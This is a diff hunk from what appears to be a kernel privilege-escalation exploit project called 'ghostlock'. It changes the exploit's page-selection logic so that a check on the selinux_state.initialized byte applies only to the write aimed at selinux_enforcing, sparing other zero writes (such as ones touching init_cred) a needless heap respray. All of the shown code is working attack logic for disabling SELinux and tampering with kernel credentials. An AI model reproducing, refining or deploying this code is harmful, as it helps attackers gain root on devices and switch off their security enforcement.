@@ -1119,13 +1119,26 @@ namespace ghostlock::support {
                 };
                 const uint32_t init_off =
                         session::g_exploit_session.profile.selinux_initialized_offset();
+                /* The initialized byte is a `selinux_state` field: the rule is
+                 * meaningful only for W1's target. W1p (`init_cred` usage) and
+                 * any future zero write elsewhere carry the same request shape
+                 * but not that field, so applying it there rejects half the
+                 * pages for nothing and pays a respray. A zero W1 target keeps
+                 * the old check-everything behaviour (fail closed; a live W1
+                 * with target 0 is refused before a spray anyway). */
+                const uintptr_t w1_target = session::g_exploit_session.addresses.data_alias(
+                    ghostlock::profile::selinux_enforcing());
+                const bool initialized_target =
+                    w1_target == 0 || request.target == w1_target;
                 if (!payload_write_layout_matches_request(&request, &layout)) {
                     pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                                request.preserve_child, layout.right);
-                } else if (!payload_write_layout_accepts_page(&request, &layout, init_off)) {
-                    pr_warning("W1 value %016zx leaves selinux_state.initialized "
-                               "(byte %u) even; taking another page\n",
-                               layout.right, init_off);
+                } else if (initialized_target &&
+                           !payload_write_layout_accepts_page(&request, &layout, init_off)) {
+                    pr_warning("W1 value %016zx (target %016zx) leaves "
+                               "selinux_state.initialized (byte %u) even; "
+                               "taking another page\n",
+                               layout.right, request.target, init_off);
                 } else {
                     pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                             ms_since(&t_good));
